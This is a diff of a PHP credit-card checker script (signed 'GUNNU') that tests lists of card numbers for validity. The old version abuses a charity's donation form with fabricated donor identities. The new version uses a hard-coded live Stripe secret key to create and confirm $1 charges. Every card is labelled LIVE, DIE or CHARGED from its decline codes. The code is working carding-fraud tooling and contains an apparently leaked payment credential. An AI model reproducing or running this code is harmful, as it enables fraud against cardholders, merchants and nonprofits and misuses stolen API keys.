@@ -1,198 +1,309 @@
 <?php
-error_reporting(0);
-set_time_limit(0);
+
+
+//===================== [ MADE BY GUNNU ] ====================//
+#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#
+
+
+
 error_reporting(0);
 date_default_timezone_set('America/Buenos_Aires');
-function multiexplode($delimiters, $string)
-{
-  $one = str_replace($delimiters, $delimiters[0], $string);
-  $two = explode($delimiters[0], $one);
-  return $two;
-}
-$lista = $_GET['lista'];
-$cc = multiexplode(array(":", "|", ""), $lista)[0];
-$mes = multiexplode(array(":", "|", ""), $lista)[1];
-$ano = multiexplode(array(":", "|", ""), $lista)[2];
-$cvv = multiexplode(array(":", "|", ""), $lista)[3];
 
-function GetStr($string, $start, $end)
-{
-  $str = explode($start, $string);
-  $str = explode($end, $str[1]);
-  return $str[0];
+
+//================ [ FUNCTIONS & LISTA ] ===============//
+
+function GetStr($string, $start, $end){
+    $string = ' ' . $string;
+    $ini = strpos($string, $start);
+    if ($ini == 0) return '';
+    $ini += strlen($start);
+    $len = strpos($string, $end, $ini) - $ini;
+    return trim(strip_tags(substr($string, $ini, $len)));
 }
-#==============[Randomizing Details Api]
-$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
-preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
-$fname = $matches1[1][0];
-preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
-$lname = $matches1[1][0];
-preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
-$email = $matches1[1][0];
-preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
-$add = $matches1[1][0];
-preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
-$city = $matches1[1][0];
-preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
-$state = $matches1[1][0];
-preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
-$num = $matches1[1][0];
-preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
-$zip = $matches1[1][0];
-#=====================[1st REQ]
+
+
+function multiexplode($seperator, $string){
+    $one = str_replace($seperator, $seperator[0], $string);
+    $two = explode($seperator[0], $one);
+    return $two;
+    };
+
+$sk = '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';
+$lista = $_GET['lista'];
+    $cc = multiexplode(array(":", "|", ""), $lista)[0];
+    $mes = multiexplode(array(":", "|", ""), $lista)[1];
+    $ano = multiexplode(array(":", "|", ""), $lista)[2];
+    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
+
+if (strlen($mes) == 1) $mes = "0$mes";
+if (strlen($ano) == 2) $ano = "20$ano";
+
+
+
+
+//================= [ CURL REQUESTS ] =================//
+
+#-------------------[1st REQ]--------------------#
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_POST, 1);
-$headers = array();
-$headers[] = 'Host: api.stripe.com';
-$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
-$headers[] = 'accept: application/json';
-$headers[] = 'content-type: application/x-www-form-urlencoded';
-$headers[] = 'sec-ch-ua-mobile: ?1';
-$headers[] = 'save-data: on';
-$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
-$headers[] = 'sec-ch-ua-platform: "Android"';
-$headers[] = 'origin: https://js.stripe.com';
-$headers[] = 'sec-fetch-site: same-site';
-$headers[] = 'sec-fetch-mode: cors';
-$headers[] = 'sec-fetch-dest: empty';
-$headers[] = 'referer: https://js.stripe.com/';
-$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$zip.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=0c3f384a-59bc-468a-8a8a-babf9abb3c0e2ce0a9&muid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e&sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c&pasted_fields=number&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=360685&key=pk_live_QMBU860cL1m4otZJNXjcDFyq');
-
-
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');
 $result1 = curl_exec($ch);
-$tk = trim(strip_tags(getStr($result1,'"id": "','"')));
+$tok1 = Getstr($result1,'"id": "','"');
+$msg = Getstr($result1,'"message": "','"');
+//echo "<br><b>Result1: </b> $result1<br>";
 
-#==================[2 REQ]
+#-------------------[2nd REQ]--------------------#
+
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_POST, 1);
-$headers = array();
-$headers[] = 'Host: api.stripe.com';
-$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
-$headers[] = 'accept: application/json';
-$headers[] = 'content-type: application/x-www-form-urlencoded';
-$headers[] = 'sec-ch-ua-mobile: ?1';
-$headers[] = 'save-data: on';
-$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
-$headers[] = 'sec-ch-ua-platform: "Android"';
-$headers[] = 'origin: https://js.stripe.com';
-$headers[] = 'sec-fetch-site: same-site';
-$headers[] = 'sec-fetch-mode: cors';
-$headers[] = 'sec-fetch-dest: empty';
-$headers[] = 'referer: https://js.stripe.com/';
-$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&guid=0c3f384a-59bc-468a-8a8a-babf9abb3c0e2ce0a9&muid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e&sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=362283&key=pk_live_QMBU860cL1m4otZJNXjcDFyq&pasted_fields=number');
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card');
 $result2 = curl_exec($ch);
-$tk2 = trim(strip_tags(getStr($result2,'"id": "','"')));
+$tok2 = Getstr($result2,'"id": "','"');
+//echo "<b>Result2: </b> $result2<br>";
 
-#=================[3rd req]
+#-------------------[3rd REQ]--------------------#
+
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://hopeinlancaster.org/wp-admin/admin-ajax.php');
-curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
-curl_setopt($ch, CURLOPT_POST, 1);
-$headers = array();
-$headers[] = 'Host: hopeinlancaster.org';
-$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
-$headers[] = 'sec-ch-ua-mobile: ?1';
-$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
-$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
-$headers[] = 'accept: */*';
-$headers[] = 'x-requested-with: XMLHttpRequest';
-$headers[] = 'save-data: on';
-$headers[] = 'sec-ch-ua-platform: "Android"';
-$headers[] = 'origin: https://hopeinlancaster.org';
-$headers[] = 'sec-fetch-site: same-origin';
-$headers[] = 'sec-fetch-mode: cors';
-$headers[] = 'sec-fetch-dest: empty';
-$headers[] = 'referer: https://hopeinlancaster.org/donations/';
-$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
-$headers[] = 'cookie: __stripe_mid=76fbe8de-b94d-4ec2-936f-9575b181e6dd3a7a9e';
-$headers[] = 'cookie: __stripe_sid=890d4ffe-afff-49d7-af22-1e0bfc66d64d6c544c';
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$tok2.'/confirm');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken='.$tk2.'&paymentMethodID='.$tk.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&type=payment&amount=NTAuMDA%3D&params%5Bvalue%5D=ds-1550084928589&params%5Bname%5D=HOPE+In+Lancaster%2C+Inc&params%5Bamount%5D=NTAuMDA%3D&params%5Bdescription%5D=%2450.00+One-Time+Donation&params%5Bpanellabel%5D=Confirm+Payment&params%5Btype%5D=payment&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=USD&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=https%3A%2F%2Fhopeinlancaster.org%2Fsuccess&params%5Berror_url%5D=https%3A%2F%2Fhopeinlancaster.org%2Ffail&params%5Bbutton_id%5D=MyButton&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_QMBU860cL1m4otZJNXjcDFyq&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fhopeinlancaster.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fwww.hopeinlancaster.org%2Fwp-content%2Fuploads%2F2016%2F03%2FHOPE-LOGO.png&params%5Binstance%5D=ds1550084928589&params%5Bds_nonce%5D=329a05b2f1&ds_nonce=329a05b2f1');
+curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method='.$tok1.'');
 $result3 = curl_exec($ch);
-$msg = trim(strip_tags(getStr($result3,'message":"','"')));
+$dcode = Getstr($result3,'"decline_code": "','"');
+$reason = Getstr($result3,'"reason": "','"');
+$riskl = Getstr($result3,'"risk_level": "','"');
+$seller_msg = Getstr($result3,'"seller_message": "','"');
+$cvccheck = Getstr($result3,'"cvc_check": "','"');
+
+if ($cvccheck == "pass") $cvccheck = "Pass! ✅";
+elseif ($cvccheck == "fail") $cvccheck = "Fail! ❌";
+elseif ($cvccheck == "unavailable") $cvccheck = "NA";
 
 
-#===============[Card Response]
-if (strpos($result33, '"cvc_check": "pass"')) {
-  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED HYPER ♛ </span></br>';
-}
-elseif(strpos($result3, "Thank You For Donation." )) {
-  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED HYPER ♛ </span></br>';
-}
-elseif(strpos($result3, "Thank You." )) {
-  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED HYPER </span></br>';
-}
-if(strpos($result3, "Your card's security code is incorrect")) {
 
-  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . ' </span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN MATCHED [HYPER] ♛ </span></br>'; 
+$respo = "D_code: <b>$dcode | </b>Reason: <b>$reason | </b>Cvv: <b>$cvccheck | </b>Risk: <b>$riskl | </b>Msg: <b>$seller_msg</b><br>";
+//echo "<b><br>Result: </b>$respo<br>";
+
+
+
+$receipturl = trim(strip_tags(getStr($result3,'"receipt_url": "','"')));
+
+
+
+//=================== [ RESPONSES ] ===================//
+
+if(strpos($result3, '"seller_message": "Payment complete."' )) {
+    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 Charged ✅ <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+}
+elseif(strpos($result3,'"cvc_check": "pass"')){
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
+}
+
+
+elseif(strpos($result1, "generic_decline")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
+    }
+elseif(strpos($result3, "generic_decline" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
+}
+elseif(strpos($result3, "insufficient_funds" )) {
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
+}
+
+elseif(strpos($result3, "fraudulent" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
+}
+elseif(strpos($resul3, "do_not_honor" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+    }
+elseif(strpos($resul2, "do_not_honor" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($result,"fraudulent")){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
 
 }
-elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
-  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED - Incorrect Zip HYPER♛ </span></br>';
+
+elseif(strpos($result2,'"code": "incorrect_cvc"')){
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
 }
-elseif(strpos($result3, 'Your card has insufficient funds.')) {
-  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Insufficient Funds HYPER♛ </span></br>';
+elseif(strpos($result1,' "code": "invalid_cvc"')){
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+     
+}
+elseif(strpos($result1,"invalid_expiry_month")){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';
+
+}
+elseif(strpos($result2,"invalid_account")){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD ACCOUNT</span><br>';
+
+}
+
+elseif(strpos($result2, "do_not_honor")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($result2, "lost_card" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
+}
+elseif(strpos($result3, "lost_card" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY GUNNU</span> <br>';
+}
+
+elseif(strpos($result2, "stolen_card" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
+    }
+
+elseif(strpos($result3, "stolen_card" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: STOLEN CARD</span><br>';
+
+
+}
+elseif(strpos($result2, "transaction_not_allowed" )) {
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: TRANSACTION NOT ALLOWED</span><br>';
+    }
+    elseif(strpos($result3, "authentication_required")) {
+    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
+   } 
+   elseif(strpos($result3, "card_error_authentication_required")) {
+    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
+   } 
+   elseif(strpos($result2, "card_error_authentication_required")) {
+    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
+   } 
+   elseif(strpos($result1, "card_error_authentication_required")) {
+    	echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: 32DS REQUIRED</span><br>';
+   } 
+elseif(strpos($result3, "incorrect_cvc" )) {
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result2, "pickup_card" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
+}
+elseif(strpos($result3, "pickup_card" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
+
+}
+elseif(strpos($result2, 'Your card has expired.')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
 }
 elseif(strpos($result3, 'Your card has expired.')) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Expired HYPER♛</span> </br>';
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
+
 }
-elseif (strpos($result3, "pickup_card")) {
-  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Pickup Card_Card - Sometime Useable HYPER ♛ </span></br>';
+elseif(strpos($result3, "card_decline_rate_limit_exceeded")) {
+	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK IS AT RATE LIMIT</span><br>';
 }
-elseif(strpos($result3, 'Your card number is incorrect.')) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number HYPER ♛</span> </br>';
+elseif(strpos($result3, '"code": "processing_error"')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
+    }
+elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
+    }
+elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
+    }
+elseif(strpos($result2, '"code": "processing_error"')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: PROCESSING ERROR</span><br>';
+    }
+elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
+    }
+elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SERVICE NOT ALLOWED</span><br>';
+
 }
- elseif (strpos($result3, "incorrect_number")) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number HYPER♛</span> </br>';
+elseif(strpos($result, "incorrect_number")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
 }
-elseif(strpos($result3, 'Your card was declined.')) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Declined HYPER ♛</span> </br>';
+elseif(strpos($result1, "incorrect_number")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER</span><br>';
+
+
+}elseif(strpos($result1, "do_not_honor")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+
 }
-elseif (strpos($result3, "generic_decline")) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Generic_Decline HYPER♛</span> </br>';
+elseif(strpos($result1, 'Your card was declined.')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
+
 }
-elseif (strpos($result3, "do_not_honor")) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Do_Not_Honor HYPER ♛</span> </br>';
+elseif(strpos($result1, "do_not_honor")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
+    }
+elseif(strpos($result2, "generic_decline")) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC CARD</span><br>';
 }
-elseif (strpos($result3, '"cvc_check": "unchecked"')) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Unchecked [Proxy Dead] HYPER ♛</span> </br>';
+elseif(strpos($result, 'Your card was declined.')) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
+
 }
-elseif (strpos($result3, '"cvc_check": "fail"')) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Fail HYPER♛</span> </br>';
+elseif(strpos($result3,' "decline_code": "do_not_honor"')){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
-elseif (strpos($result3, "expired_card")) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Expired Card HYPER ♛</span> </br>';
+elseif(strpos($result2,'"cvc_check": "unchecked"')){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
 }
-elseif (strpos($result3,'Your card does not support this type of purchase.')) {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Doesnt Support This Purchase HYPER ♛</span> </br>';
+elseif(strpos($result2,'"cvc_check": "fail"')){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
+}
+elseif(strpos($result3, "card_not_supported")) {
+	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "unavailable"')){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
+}
+elseif(strpos($result3,'"cvc_check": "unchecked"')){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
+}
+elseif(strpos($result3,'"cvc_check": "fail"')){
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
+}
+elseif(strpos($result3,"currency_not_supported")) {
+	echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
 }
 
+elseif (strpos($result,'Your card does not support this type of purchase.')) {
+    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
+    }
+
+elseif(strpos($result2,'"cvc_check": "pass"')){
+    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
+}
+elseif(strpos($result3, "fraudulent" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
+}
+elseif(strpos($result1, "testmode_charges_only" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY #DIE OR INVALID</span><br>';
+}
+elseif(strpos($result1, "api_key_expired" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY REVOKED</span><br>';
+}
+elseif(strpos($result1, "parameter_invalid_empty" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK</span><br>';
+}
+elseif(strpos($result1, "card_not_supported" )) {
+    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
+}
 else {
-  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . ' </span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ '.$msg.' [HYPER] ♛</span> </br>';
+    echo '#DIE</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
+   
+   
+      
 }
-
 curl_close($ch);
 ob_flush();
-
-
 ?>
